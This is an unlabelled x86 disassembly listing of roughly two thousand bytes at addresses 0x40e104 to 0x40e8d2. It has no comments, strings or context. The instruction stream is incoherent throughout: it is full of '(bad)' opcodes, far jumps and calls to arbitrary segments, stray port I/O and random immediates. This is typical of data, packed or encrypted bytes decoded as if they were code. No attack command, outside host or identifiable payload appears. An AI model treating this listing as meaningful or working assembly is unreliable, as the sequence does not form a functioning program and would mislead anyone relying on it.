  40e104:	bound  ecx,QWORD PTR [ebp+0x32]
  40e107:	jnp    0x40e0a0
  40e109:	jmp    0x3740:0x135dabcc
  40e110:	mov    al,ds:0xd6609e6
  40e115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e116:	dec    esp
  40e117:	xor    esi,DWORD PTR [edi]
  40e119:	push   esi
  40e11a:	adc    eax,0xf4bb4d7c
  40e11f:	cdq    
  40e120:	mov    BYTE PTR [edx-0xb],0x2f
  40e124:	and    al,0xd2
  40e126:	mov    eax,ds:0x2da6dfdc
  40e12b:	in     al,0x6e
  40e12d:	es push cs
  40e12f:	dec    esp
  40e130:	test   DWORD PTR [esp+esi*1+0x20ffa57a],ebp
  40e137:	out    dx,eax
  40e138:	bound  esp,QWORD PTR [ebp-0x3a]
  40e13b:	loope  0x40e17e
  40e13d:	jns    0x40e10c
  40e13f:	pushf  
  40e140:	jbe    0x40e108
  40e142:	out    dx,eax
  40e143:	or     al,0xda
  40e145:	out    0x9b,eax
  40e147:	pop    ds
  40e148:	sub    eax,DWORD PTR [esi]
  40e14a:	mov    ds:0x16f0819,al
  40e14f:	add    ah,al
  40e151:	xchg   ecx,eax
  40e152:	sbb    DWORD PTR [edi+esi*1+0xbfd96c9],edx
  40e159:	xchg   edi,eax
  40e15a:	push   edx
  40e15b:	xor    edi,ecx
  40e15d:	jle    0x40e13d
  40e15f:	fisubr DWORD PTR [edi]
  40e161:	and    bh,BYTE PTR es:[eax+0x63]
  40e165:	div    BYTE PTR [edx+eiz*8]
  40e168:	push   edi
  40e169:	or     DWORD PTR [edi],eax
  40e16b:	mov    BYTE PTR [eax+ebx*1-0x32],ch
  40e16f:	daa    
  40e170:	fdivr  DWORD PTR [eax+0x45a382]
	...
  40e1be:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e1c4:	xchg   esp,eax
  40e1c5:	mov    ebx,0x5d8b00bf
  40e1ca:	sbb    eax,DWORD PTR [esi]
  40e1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1cd:	pop    ds
  40e1ce:	sti    
  40e1cf:	push   ebx
  40e1d0:	call   0x75ee1d5
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	call   DWORD PTR [esi+0x67bd686f]
  40e1dd:	add    edx,DWORD PTR [esi]
  40e1df:	mov    dl,0x84
  40e1e1:	(bad)  
  40e1e2:	ss shl cl,cl
  40e1e5:	xlat   BYTE PTR ds:[ebx]
  40e1e6:	pop    ebx
  40e1e7:	les    edx,FWORD PTR [eax-0x42]
  40e1ea:	push   ss
  40e1eb:	out    dx,al
  40e1ec:	retf   0x4a29
  40e1ef:	mov    ds:0x72d63001,al
  40e1f4:	adc    BYTE PTR [ebx],dh
  40e1f6:	fld    DWORD PTR fs:[esp+edx*2+0x3d]
  40e1fb:	and    eax,0xb5998be7
  40e200:	pop    eax
  40e201:	push   es
  40e202:	mov    ds:0xb8adff1d,eax
  40e207:	jge    0x40e264
  40e209:	and    DWORD PTR [ecx+ebx*2+0x31],0xc8cc4f7b
  40e211:	sub    esp,DWORD PTR [ebx-0x3e]
  40e214:	push   esp
  40e215:	dec    edi
  40e216:	mov    bh,0xed
  40e218:	xor    ebp,DWORD PTR [edx-0x7a]
  40e21b:	or     cl,BYTE PTR [esi]
  40e21d:	xor    al,0x0
  40e21f:	or     DWORD PTR [eax+0x46c74f22],eax
  40e225:	aam    0x4e
  40e227:	aad    0x33
  40e229:	sbb    edx,DWORD PTR [edi+0x4cece612]
  40e22f:	jne    0x40e2a5
  40e231:	jo     0x40e204
  40e233:	jmp    0x40e1f0
  40e235:	lahf   
  40e236:	(bad)  
  40e237:	out    dx,eax
  40e238:	mov    eax,0x50067403
  40e23d:	push   es
  40e23e:	dec    esp
  40e23f:	jmp    DWORD PTR [edx]
  40e241:	rcr    BYTE PTR [ebx-0xa],1
  40e244:	mov    dl,0x85
  40e246:	rcl    DWORD PTR [esi+0x1e7d7f47],1
  40e24c:	es jmp 0x113d9e12
  40e252:	test   eax,0xb5491e82
  40e257:	adc    eax,0xa434663b
  40e25c:	gs scas eax,DWORD PTR es:[edi]
  40e25e:	mov    edi,0x6e612464
  40e263:	and    BYTE PTR [ebp+edx*2+0x54],al
  40e267:	icebp  
  40e268:	retf   0xe35c
  40e26b:	mov    WORD PTR [ecx+0x643fafb6],gs
  40e271:	push   ss
  40e272:	adc    al,0xd4
  40e274:	in     al,dx
  40e275:	xor    ebp,DWORD PTR [edi]
  40e277:	sub    BYTE PTR [eax+0x6a87bd53],ah
  40e27d:	fs dec edx
  40e27f:	mov    al,ds:0x8ad42f8a
  40e284:	or     eax,0xda84ffb8
  40e28a:	lods   eax,DWORD PTR ds:[esi]
  40e28b:	aad    0x7d
  40e28d:	vpsubusw ymm4,ymm5,ymm0
  40e291:	jmp    0xfb21:0x9f180ea
  40e298:	cdq    
  40e299:	dec    ebx
  40e29a:	and    edx,ecx
  40e29c:	cwde   
  40e29d:	jne    0x40e2d4
  40e29f:	(bad)  
  40e2a0:	pop    ebp
  40e2a1:	adc    DWORD PTR [esi],ebp
  40e2a3:	mov    al,ds:0xd1637ce2
  40e2a8:	(bad)  
  40e2a9:	mov    ebp,0xba3c8ffc
  40e2ae:	lahf   
  40e2af:	or     eax,0x2458769
  40e2b4:	mov    esi,0x1c4efb43
  40e2b9:	jo     0x40e28f
  40e2bb:	add    esp,DWORD PTR [ebx+ebx*1+0x7f]
  40e2bf:	enter  0x9433,0x68
  40e2c3:	push   esi
  40e2c4:	xor    al,0x4c
  40e2c6:	ss and BYTE PTR ds:[esi],ch
  40e2ca:	sub    eax,0xb92f2d2a
  40e2cf:	sbb    bh,BYTE PTR [eax-0x174f6917]
  40e2d5:	push   0x1e91574e
  40e2da:	sub    BYTE PTR ds:0xe6cfd70b,cl
  40e2e0:	inc    edi
  40e2e1:	push   ds
  40e2e2:	jge    0x40e349
  40e2e4:	(bad)  
  40e2e5:	mov    ds:0x8581e214,eax
  40e2ea:	aam    0x5f
  40e2ec:	dec    ebp
  40e2ed:	pop    esp
  40e2ee:	pop    ebp
  40e2ef:	int3   
  40e2f0:	ins    DWORD PTR es:[edi],dx
  40e2f1:	test   BYTE PTR [eax],al
  40e2f3:	int3   
  40e2f4:	call   0x3b5:0x67c91c41
  40e2fb:	loopne 0x40e344
  40e2fd:	rcl    BYTE PTR [eax+0x1fb1ba9b],cl
  40e303:	mov    edx,0x5a88cb1
  40e308:	test   BYTE PTR [ebx],cl
  40e30a:	push   esp
  40e30b:	dec    ecx
  40e30c:	xor    edi,DWORD PTR [edx-0x55]
  40e30f:	hlt    
  40e310:	sbb    bl,BYTE PTR [eax+ebp*8]
  40e313:	(bad)  
  40e314:	xchg   esi,eax
  40e315:	mov    BYTE PTR [edi],ch
  40e317:	retf   
  40e318:	pop    eax
  40e319:	je     0x40e2d1
  40e31b:	lods   al,BYTE PTR ds:[esi]
  40e31c:	and    al,0x62
  40e31e:	jle    0x40e33c
  40e320:	sbb    eax,0xec55c1a6
  40e325:	mov    cl,0x57
  40e327:	cmp    eax,0xc9fed74b
  40e32c:	adc    eax,DWORD PTR [eax-0x4b4e7061]
  40e332:	ror    BYTE PTR [eax-0x5fa27054],0x23
  40e339:	neg    DWORD PTR [edx+0x5b]
  40e33c:	xchg   BYTE PTR [ecx+0x42c815c3],cl
  40e342:	rcr    DWORD PTR [ebx+0x6eb21834],cl
  40e348:	nop
  40e349:	and    al,0xf7
  40e34b:	test   al,0xe5
  40e34d:	lods   al,BYTE PTR ds:[esi]
  40e34e:	adc    eax,0x2a382d0e
  40e353:	cdq    
  40e354:	mov    dl,BYTE PTR [esi]
  40e356:	test   al,0x90
  40e358:	(bad)  
  40e359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e35a:	adc    bh,ch
  40e35c:	sub    esi,DWORD PTR [eax+0x52]
  40e35f:	add    eax,0x341eb393
  40e365:	cmp    eax,0x765e7465
  40e36a:	pusha  
  40e36b:	pop    ebp
  40e36c:	stos   BYTE PTR es:[edi],al
  40e36d:	push   eax
  40e36e:	pop    eax
  40e36f:	mov    bh,0xc1
  40e371:	cld    
  40e372:	mov    bl,0x31
  40e374:	add    eax,0x7fdf2437
  40e379:	jmp    0xd23b33c5
  40e37e:	adc    DWORD PTR [eax+0x3e45cbd5],esp
  40e384:	pop    ss
  40e385:	or     al,0xee
  40e387:	push   eax
  40e388:	popa   
  40e389:	cmc    
  40e38a:	fs popf 
  40e38c:	imul   ebp,eax,0xffffffa4
  40e38f:	xchg   BYTE PTR [ebx],dl
  40e391:	fwait
  40e392:	and    al,BYTE PTR [edx+0x5fd3ac85]
  40e398:	sub    ch,dh
  40e39a:	bsr    ebp,DWORD PTR [eax]
  40e39d:	jp     0x40e40e
  40e39f:	sbb    eax,0xfc0771a
  40e3a4:	xchg   ebx,eax
  40e3a5:	xchg   BYTE PTR [edx+ecx*2+0x6d7c896b],cl
  40e3ac:	sub    BYTE PTR [eax+0x75],0x7b
  40e3b0:	inc    edx
  40e3b1:	jmp    0x9912:0x7de9e1a7
  40e3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3b9:	push   ds
  40e3ba:	or     al,0x28
  40e3bc:	jg     0x40e3c5
  40e3be:	jns    0x40e41e
  40e3c0:	push   ecx
  40e3c1:	pop    ds
  40e3c2:	push   eax
  40e3c3:	cmp    al,0xf9
  40e3c5:	div    BYTE PTR [eax+edi*1+0x4b]
  40e3c9:	mov    bl,0x98
  40e3cb:	jno    0x40e424
  40e3cd:	jnp    0x40e403
  40e3cf:	pop    ecx
  40e3d0:	(bad)  
  40e3d1:	xor    BYTE PTR [edx-0x6a],ch
  40e3d4:	pop    ebp
  40e3d5:	push   cs
  40e3d6:	stos   BYTE PTR es:[edi],al
  40e3d7:	cwde   
  40e3d8:	cmp    BYTE PTR [ecx-0x4a],bh
  40e3db:	mov    esp,0xbf813071
  40e3e0:	push   es
  40e3e1:	push   ss
  40e3e2:	test   DWORD PTR [ebx+ebx*4+0x67a5db14],0x4200fef9
  40e3ed:	and    dl,cl
  40e3ef:	int    0x22
  40e3f1:	adc    DWORD PTR [edx],0x11
  40e3f4:	xor    eax,0x67034dee
  40e3f9:	lods   al,BYTE PTR ds:[esi]
  40e3fa:	icebp  
  40e3fb:	push   eax
  40e3fc:	les    ecx,FWORD PTR [edx-0xf]
  40e3ff:	lock jns 0x40e3fb
  40e402:	(bad)  
  40e403:	pop    edx
  40e404:	test   al,0xe8
  40e406:	outs   dx,DWORD PTR ds:[esi]
  40e407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e408:	and    BYTE PTR [ecx],dl
  40e40a:	dec    eax
  40e40b:	sbb    al,0xd7
  40e40d:	push   ss
  40e40e:	mov    DWORD PTR [ebx+0x7fc12504],esp
  40e414:	inc    ebx
  40e415:	test   al,0xb0
  40e417:	xchg   esi,eax
  40e418:	inc    edi
  40e419:	mov    ecx,0x55f091da
  40e41e:	xor    dl,bl
  40e420:	push   esi
  40e421:	dec    ebx
  40e422:	inc    eax
  40e423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e424:	popf   
  40e425:	add    ecx,DWORD PTR [edx+0x36]
  40e428:	adc    ebx,DWORD PTR [ebx]
  40e42a:	out    dx,al
  40e42b:	lock xor ah,ch
  40e42e:	jb     0x40e4ac
  40e430:	jge    0x40e451
  40e432:	test   ch,ah
  40e434:	cmc    
  40e435:	mov    ebp,0x3ff6179a
  40e43b:	sbb    BYTE PTR [eax+0x6fd96b42],al
  40e441:	imul   ebp,DWORD PTR ss:[ecx+eax*1],0xd1173df7
  40e449:	test   eax,0x98ffd97d
  40e44e:	test   al,0xab
  40e450:	mov    esi,0x6f308a48
  40e455:	mov    al,0x55
  40e457:	cmc    
  40e458:	inc    esp
  40e459:	repnz stos DWORD PTR es:[edi],eax
  40e45b:	repz cwde 
  40e45d:	pop    edi
  40e45e:	mov    ds:0x943ac06d,eax
  40e463:	daa    
  40e464:	ret    0x93c6
  40e467:	push   eax
  40e468:	or     al,0xc5
  40e46a:	icebp  
  40e46b:	or     esi,DWORD PTR [ebx-0x1b]
  40e46e:	push   eax
  40e46f:	push   cs
  40e470:	ss pop esp
  40e472:	push   ecx
  40e473:	sub    BYTE PTR ds:0x2207c8e9,dl
  40e479:	fsubr  DWORD PTR [edx]
  40e47b:	and    dl,BYTE PTR [eax+0x4aa11a9e]
  40e481:	xor    al,0xf9
  40e483:	outs   dx,BYTE PTR ds:[esi]
  40e484:	out    dx,eax
  40e485:	mov    bh,0xf9
  40e487:	sub    ah,dl
  40e489:	xor    al,0x62
  40e48b:	xchg   ch,dh
  40e48d:	adc    bh,ch
  40e48f:	mov    ch,0xba
  40e491:	imul   eax,DWORD PTR [ebx-0x497b31be],0xffffffad
  40e498:	adc    al,0x7
  40e49a:	in     eax,0x6b
  40e49c:	mov    bh,0x81
  40e49e:	ja     0x40e44c
  40e4a0:	cs retf 0x11cf
  40e4a4:	dec    edx
  40e4a5:	push   ds
  40e4a6:	xchg   BYTE PTR [edi+0x4b],dl
  40e4a9:	push   cx
  40e4ab:	mov    ah,0x56
  40e4ad:	jge    0x40e437
  40e4af:	mov    DWORD PTR [edx-0x14],edx
  40e4b2:	mov    edx,edi
  40e4b4:	aam    0xff
  40e4b6:	mov    eax,ds:0xab52fdd7
  40e4bb:	enter  0x2d1c,0x6c
  40e4bf:	jbe    0x40e44b
  40e4c1:	or     DWORD PTR [eax-0x42e745a3],0x102c0cdd
  40e4cb:	inc    ecx
  40e4cc:	sub    al,0x4
  40e4ce:	dec    edi
  40e4cf:	push   0xffffffac
  40e4d1:	(bad)  
  40e4d2:	clc    
  40e4d3:	pop    edx
  40e4d4:	ret    
  40e4d5:	xchg   ebp,eax
  40e4d6:	xor    BYTE PTR [ebx-0x26f58c13],0x92
  40e4dd:	xchg   ecx,eax
  40e4de:	ins    BYTE PTR es:[edi],dx
  40e4df:	dec    ebx
  40e4e0:	shr    BYTE PTR [edx],cl
  40e4e2:	sbb    BYTE PTR [ecx],dl
  40e4e4:	sbb    al,0xc8
  40e4e6:	push   cs
  40e4e7:	cmp    BYTE PTR [ecx-0x4bc62575],dl
  40e4ed:	push   edi
  40e4ee:	inc    ebp
  40e4ef:	mov    al,ds:0x50434aa2
  40e4f4:	iret   
  40e4f5:	dec    ebp
  40e4f6:	rol    BYTE PTR [edi-0x29],1
  40e4f9:	xchg   edi,eax
  40e4fa:	or     eax,0x9b2c2395
  40e4ff:	pop    esp
  40e500:	inc    eax
  40e501:	add    eax,0x45f74ecd
  40e506:	movsx  edi,BYTE PTR [ebx+0x53aaf38b]
  40e50d:	stos   DWORD PTR es:[edi],eax
  40e50e:	inc    ebx
  40e50f:	dec    edi
  40e510:	pushf  
  40e511:	dec    ebp
  40e512:	pop    ebx
  40e513:	mov    al,ds:0xf8c29547
  40e518:	es or  eax,0x58a7a166
  40e51e:	cmp    BYTE PTR [esi-0x4d77d9e6],ch
  40e524:	popa   
  40e525:	dec    eax
  40e526:	mov    al,ds:0x9b97eb7f
  40e52b:	and    eax,0x5fb4ad5e
  40e530:	ds mov ebp,0xe5318d64
  40e536:	push   0x1d
  40e538:	loope  0x40e547
  40e53a:	push   es
  40e53b:	jmp    FWORD PTR [edi]
  40e53d:	(bad)  
  40e53e:	call   0x826c:0x18ae1c92
  40e545:	mov    eax,ds:0x66feae
  40e54a:	mov    eax,ds:0x980d3c6d
  40e54f:	sbb    eax,0xe5f56d20
  40e554:	ror    ecx,cl
  40e556:	aas    
  40e557:	imul   edi,DWORD PTR [esi+0x4a],0xa8d6e695
  40e55e:	push   ebp
  40e55f:	imul   ebx,DWORD PTR [ebx+0x1c],0x298ba281
  40e566:	adc    dl,BYTE PTR [ecx+0x4d]
  40e569:	mov    dh,0x22
  40e56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e56c:	(bad)  
  40e56d:	int    0xab
  40e56f:	imul   ecx,DWORD PTR [ebx],0xfffffff8
  40e572:	jbe    0x40e527
  40e574:	jne    0x40e58e
  40e576:	xlat   BYTE PTR ds:[ebx]
  40e577:	mov    ds:0x4e2cd17c,eax
  40e57c:	inc    ecx
  40e57d:	in     eax,dx
  40e57e:	or     al,0x8b
  40e580:	dec    edi
  40e581:	or     DWORD PTR [ecx+0x26],0x9e9face1
  40e588:	cvtpi2ps xmm1,QWORD PTR ds:0x6298828f
  40e58f:	in     al,dx
  40e590:	pop    ss
  40e591:	imul   esi,DWORD PTR [ebp-0x78],0xe6f17134
  40e598:	mov    ebx,0x6912e147
  40e59d:	pop    edi
  40e59e:	xchg   esp,eax
  40e59f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5a0:	ja     0x40e5fc
  40e5a2:	pop    ebx
  40e5a3:	mov    esi,0x50729489
  40e5a8:	xchg   edx,eax
  40e5a9:	sub    eax,0x5bac5f38
  40e5ae:	stc    
  40e5af:	fs pop ss
  40e5b1:	adc    edx,ecx
  40e5b3:	add    BYTE PTR [eax+0x80f6510],0xf4
  40e5ba:	cmp    DWORD PTR [ebp+0x54],ebp
  40e5bd:	das    
  40e5be:	jg     0x40e5b7
  40e5c0:	or     al,0x4b
  40e5c2:	outs   dx,BYTE PTR ds:[esi]
  40e5c3:	(bad)  
  40e5c5:	jne    0x40e58c
  40e5c7:	or     bh,BYTE PTR ds:0x2a948048
  40e5cd:	cwde   
  40e5ce:	loopne 0x40e55d
  40e5d0:	xor    edi,DWORD PTR [ebx+0x73]
  40e5d3:	inc    esp
  40e5d4:	xlat   BYTE PTR ds:[ebx]
  40e5d5:	sbb    DWORD PTR [edi],esi
  40e5d7:	repnz pop eax
  40e5d9:	pop    ebp
  40e5da:	jo     0x40e5da
  40e5dc:	xor    bh,BYTE PTR [ecx+0x5ab5c493]
  40e5e2:	ret    
  40e5e3:	repz mov dh,0x32
  40e5e6:	into   
  40e5e7:	pop    ds
  40e5e8:	fwait
  40e5e9:	mov    esi,0xfa60c28a
  40e5ee:	loope  0x40e5d4
  40e5f0:	xchg   ebp,eax
  40e5f1:	or     eax,0xe6ac78cf
  40e5f6:	sbb    DWORD PTR [eax-0x45d37dc8],edx
  40e5fc:	sub    dl,bh
  40e5fe:	scas   eax,DWORD PTR es:[edi]
  40e5ff:	in     eax,0x31
  40e601:	cmp    al,0x9d
  40e603:	scas   eax,DWORD PTR es:[edi]
  40e604:	in     al,0xb3
  40e606:	or     eax,ebp
  40e608:	cs hlt 
  40e60a:	pusha  
  40e60b:	xor    al,0x3
  40e60d:	in     al,dx
  40e60e:	xchg   ebx,eax
  40e60f:	nop
  40e610:	fiadd  DWORD PTR [eax+0x6124080c]
  40e616:	out    0xac,al
  40e618:	call   DWORD PTR [ebx+0x7e]
  40e61b:	jae    0x40e68e
  40e61d:	fisttp WORD PTR [ebx]
  40e61f:	pop    ds
  40e620:	retf   
  40e621:	jecxz  0x40e62e
  40e623:	aas    
  40e624:	sti    
  40e625:	in     eax,dx
  40e626:	add    al,0x12
  40e628:	hlt    
  40e629:	jge    0x40e61c
  40e62b:	sahf   
  40e62c:	xchg   esi,eax
  40e62d:	in     eax,0x63
  40e62f:	test   BYTE PTR [esi],ch
  40e631:	sub    eax,0xd6690ab0
  40e636:	in     al,dx
  40e637:	call   DWORD PTR [ecx+0x42609c02]
  40e63d:	add    ah,BYTE PTR [ebp+eax*4-0x30a50944]
  40e644:	or     esp,DWORD PTR [edx+ecx*8-0x7604eec8]
  40e64b:	ja     0x40e666
  40e64d:	call   0x3c74:0x1d0519c4
  40e654:	adc    al,0x32
  40e656:	scas   al,BYTE PTR es:[edi]
  40e657:	fcomp  QWORD PTR [eax+0x3cd1ce0c]
  40e65d:	xor    BYTE PTR [edx],ch
  40e65f:	mov    cl,0x78
  40e661:	xchg   DWORD PTR [ecx],eax
  40e663:	aas    
  40e664:	mov    edi,0x3db98536
  40e669:	cmp    cl,0x41
  40e66c:	mov    esi,0x24b96aa
  40e671:	out    dx,al
  40e672:	jae    0x40e692
  40e674:	or     cl,BYTE PTR [ebp+0x2543db60]
  40e67a:	jecxz  0x40e6cb
  40e67c:	adc    ebp,DWORD PTR [ebx]
  40e67e:	adc    dh,ah
  40e680:	ud0    edx,DWORD PTR [ecx+0x27]
  40e684:	std    
  40e685:	fdivr  st,st(4)
  40e687:	(bad)  
  40e688:	xchg   esi,eax
  40e689:	mov    dl,dh
  40e68b:	fwait
  40e68c:	adc    ah,cl
  40e68e:	cld    
  40e68f:	mov    ebx,ebp
  40e691:	out    dx,eax
  40e692:	xchg   DWORD PTR [ecx-0x1f],edx
  40e695:	sar    dl,0x80
  40e698:	cmp    DWORD PTR [ecx],edi
  40e69a:	stos   BYTE PTR es:[edi],al
  40e69b:	pop    esi
  40e69c:	std    
  40e69d:	inc    ecx
  40e69e:	int    0x16
  40e6a0:	lahf   
  40e6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a2:	stc    
  40e6a3:	adc    al,0x3b
  40e6a5:	cwde   
  40e6a6:	cdq    
  40e6a7:	or     eax,0x1dd4f914
  40e6ac:	lock inc esp
  40e6ae:	fst    QWORD PTR [edx+0x4e2f31fa]
  40e6b4:	mov    ds:0x79ed0167,al
  40e6b9:	shl    BYTE PTR [eax-0x17],cl
  40e6bc:	mov    bl,0x4a
  40e6be:	mov    ds:0x94097a61,eax
  40e6c3:	lock out dx,eax
  40e6c5:	je     0x40e6ea
  40e6c7:	sub    bl,BYTE PTR [ebx-0x62af7ff9]
  40e6cd:	loope  0x40e734
  40e6cf:	fdiv   st,st(7)
  40e6d1:	(bad)  
  40e6d2:	call   0xf1d6b581
  40e6d7:	cmp    BYTE PTR [ebp-0xd],bh
  40e6da:	sub    eax,0x8b1ddcaa
  40e6df:	jg     0x40e6f2
  40e6e1:	push   eax
  40e6e2:	sbb    BYTE PTR [eax+0x3f4c86af],0xd8
  40e6e9:	mov    al,0xed
  40e6eb:	xor    al,BYTE PTR [esi+0x38bddf2d]
  40e6f1:	(bad)  
  40e6f2:	enter  0x6fe4,0xb6
  40e6f6:	fndisi(8087 only) 
  40e6f8:	pop    ds
  40e6f9:	sbb    al,0x6b
  40e6fb:	repz push ss
  40e6fd:	in     al,0x1a
  40e6ff:	sub    DWORD PTR [ebx+eiz*2],ebp
  40e702:	xchg   ebx,eax
  40e703:	icebp  
  40e704:	hlt    
  40e705:	xor    eax,DWORD PTR [esi+0xb36cee2]
  40e70b:	popa   
  40e70c:	pop    edx
  40e70d:	jmp    0x40e733
  40e70f:	xchg   DWORD PTR [edi],esp
  40e711:	and    al,0xe2
  40e713:	mov    bh,0x45
  40e715:	ss inc ebx
  40e717:	stos   BYTE PTR es:[edi],al
  40e718:	ret    
  40e719:	or     DWORD PTR [edi+0x32],ebp
  40e71c:	sahf   
  40e71d:	push   0x52e21bdb
  40e722:	xchg   BYTE PTR [esi+0x501d7ef0],ch
  40e728:	cmp    esi,ebp
  40e72a:	lds    edx,FWORD PTR [ecx+0xd]
  40e72d:	and    eax,0x9361d603
  40e732:	xchg   ebp,eax
  40e733:	arpl   WORD PTR [esp+ebp*8+0xef55bf],si
  40e73a:	test   DWORD PTR [ecx-0x66],0x4caeeb4d
  40e741:	cld    
  40e742:	mov    eax,ds:0x75e3ce2d
  40e747:	cmp    eax,ecx
  40e749:	sub    eax,0x227d9f6e
  40e74e:	dec    eax
  40e74f:	push   ds
  40e750:	xor    al,0x60
  40e752:	sub    ah,BYTE PTR [eax-0x5694ee55]
  40e758:	ret    
  40e759:	loope  0x40e77e
  40e75b:	mov    ebp,0x8b4dd80a
  40e760:	ds dec edx
  40e762:	retf   0xb1b7
  40e765:	dec    edx
  40e766:	pusha  
  40e767:	push   ebp
  40e768:	out    dx,eax
  40e769:	add    DWORD PTR [esi+0x2510a15e],0xffffff8c
  40e770:	mov    ch,0xc5
  40e772:	pop    ss
  40e773:	and    cl,ah
  40e775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e776:	and    dh,BYTE PTR [ecx+0x223ac068]
  40e77c:	addr16 jp 0x40e7e6
  40e77f:	mov    cl,0x7f
  40e781:	xor    DWORD PTR [esi-0x43],edx
  40e784:	mov    esi,ds
  40e786:	loop   0x40e7b8
  40e788:	pop    esi
  40e789:	jmp    0xc71f53a7
  40e78e:	repz mov eax,0x4233d709
  40e794:	add    ah,BYTE PTR [eax]
  40e796:	daa    
  40e797:	or     eax,0x69df0aa4
  40e79c:	mov    al,ds:0x730fbf88
  40e7a1:	ds aad 0xda
  40e7a4:	and    bh,al
  40e7a6:	mov    ecx,0x91934408
  40e7ab:	jl     0x40e7ef
  40e7ad:	and    BYTE PTR [ecx-0x7d90b27],ah
  40e7b3:	mov    ds:0x3f71f63c,eax
  40e7b8:	inc    ebx
  40e7b9:	push   eax
  40e7ba:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7bc:	ja     0x40e817
  40e7be:	inc    edi
  40e7bf:	jg     0x40e7b8
  40e7c1:	retf   
  40e7c2:	(bad)  
  40e7c3:	loope  0x40e753
  40e7c5:	push   eax
  40e7c6:	into   
  40e7c7:	aaa    
  40e7c8:	pop    ds
  40e7c9:	mov    ebp,0xc68e3aec
  40e7ce:	mov    bl,0x5d
  40e7d0:	(bad)  
  40e7d1:	mov    eax,0xe6db3536
  40e7d6:	mov    al,0x4e
  40e7d8:	mov    edx,0xc6a97903
  40e7dd:	cmp    eax,DWORD PTR [ebx-0x52]
  40e7e0:	lods   eax,DWORD PTR ds:[esi]
  40e7e1:	fs dec eax
  40e7e3:	add    ah,BYTE PTR [ecx+0x20b14b04]
  40e7e9:	enter  0xa8c8,0x25
  40e7ed:	cmp    eax,0x98e6fe12
  40e7f2:	and    eax,0xb4a07c95
  40e7f7:	sub    bl,bh
  40e7f9:	adc    bh,BYTE PTR [ebp-0x4ba70c7f]
  40e7ff:	jge    0x40e860
  40e801:	pop    ds
  40e802:	mov    bl,0x6f
  40e804:	mov    ebx,0xb97b32b7
  40e809:	inc    ebx
  40e80a:	test   BYTE PTR [edi],0x99
  40e80d:	cdq    
  40e80e:	and    al,0x72
  40e810:	pushf  
  40e811:	repnz xchg esi,eax
  40e813:	lea    ecx,[edi]
  40e815:	test   eax,0x95ea04c0
  40e81a:	rcr    DWORD PTR [ebx+0x7f],1
  40e81d:	(bad)  
  40e81e:	repz add al,0x74
  40e821:	iret   
  40e822:	inc    ecx
  40e823:	mov    ah,0xeb
  40e825:	std    
  40e826:	adc    eax,DWORD PTR [ebx-0x7b]
  40e829:	dec    eax
  40e82a:	stos   DWORD PTR es:[edi],eax
  40e82b:	ja     0x40e7ad
  40e82d:	push   ds
  40e82e:	jo     0x40e7cf
  40e830:	imul   ecx,DWORD PTR [esi*8-0x53bef5e1],0xb97eb572
  40e83b:	(bad)  
  40e83c:	mov    dl,cl
  40e83e:	scas   al,BYTE PTR es:[edi]
  40e83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e840:	mov    esi,0xbeb30fcc
  40e845:	pop    es
  40e846:	cdq    
  40e847:	push   ebx
  40e848:	inc    esi
  40e849:	loop   0x40e85e
  40e84b:	sahf   
  40e84c:	sub    edx,DWORD PTR [ebx-0xd]
  40e84f:	xchg   esp,eax
  40e850:	xchg   DWORD PTR [esi],edi
  40e852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e853:	ret    
  40e854:	lods   eax,DWORD PTR ds:[esi]
  40e855:	dec    esi
  40e856:	into   
  40e857:	idiv   DWORD PTR [ebx-0x1d]
  40e85a:	or     esi,DWORD PTR [ebx-0x1d]
  40e85d:	inc    edx
  40e85e:	pop    esi
  40e85f:	sub    bh,BYTE PTR [ecx-0x234a40fd]
  40e865:	inc    eax
  40e866:	(bad)  
  40e867:	loope  0x40e845
  40e869:	lods   al,BYTE PTR ds:[esi]
  40e86a:	inc    ebx
  40e86b:	das    
  40e86c:	jno    0x40e851
  40e86e:	mov    dh,0x28
  40e870:	aaa    
  40e871:	addr16 pop esp
  40e873:	out    0xaa,eax
  40e875:	mov    BYTE PTR [eax-0x65d1e9e2],al
  40e87b:	pop    es
  40e87c:	lods   eax,DWORD PTR ds:[esi]
  40e87d:	shl    DWORD PTR [edx-0x3d8086ad],1
  40e883:	lock push ds
  40e885:	push   ds
  40e886:	sahf   
  40e887:	sbb    eax,esp
  40e889:	adc    ch,al
  40e88b:	jnp    0x40e82d
  40e88d:	aaa    
  40e88e:	add    eax,DWORD PTR [esp+eiz*4-0x63]
  40e892:	xor    al,0xac
  40e894:	out    0xb0,eax
  40e896:	mov    bh,0x8
  40e898:	adc    al,0xd6
  40e89a:	loop   0x40e8ae
  40e89c:	xlat   BYTE PTR ds:[ebx]
  40e89d:	pop    ds
  40e89e:	test   BYTE PTR [ecx],ch
  40e8a0:	adc    BYTE PTR [edi-0x7652bddc],0xed
  40e8a7:	in     al,dx
  40e8a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8a9:	push   cs
  40e8aa:	lea    esp,[edi+0x6f0eb542]
  40e8b0:	pop    esi
  40e8b1:	retf   0x4d81
  40e8b4:	rol    dl,cl
  40e8b6:	in     al,0x27
  40e8b8:	fdivr  st(3),st
  40e8ba:	push   ebp
  40e8bb:	ja     0x40e8c5
  40e8bd:	aad    0x97
  40e8bf:	gs push ds
  40e8c1:	and    DWORD PTR [eax],0x5329dea1
  40e8c7:	dec    esi
  40e8c8:	loope  0x40e8ad
  40e8ca:	dec    ebp
  40e8cb:	repnz cmp ch,BYTE PTR [ebp+0x53]
  40e8cf:	xchg   edi,eax
  40e8d0:	jne    0x40e892
  40e8d2:	aas    
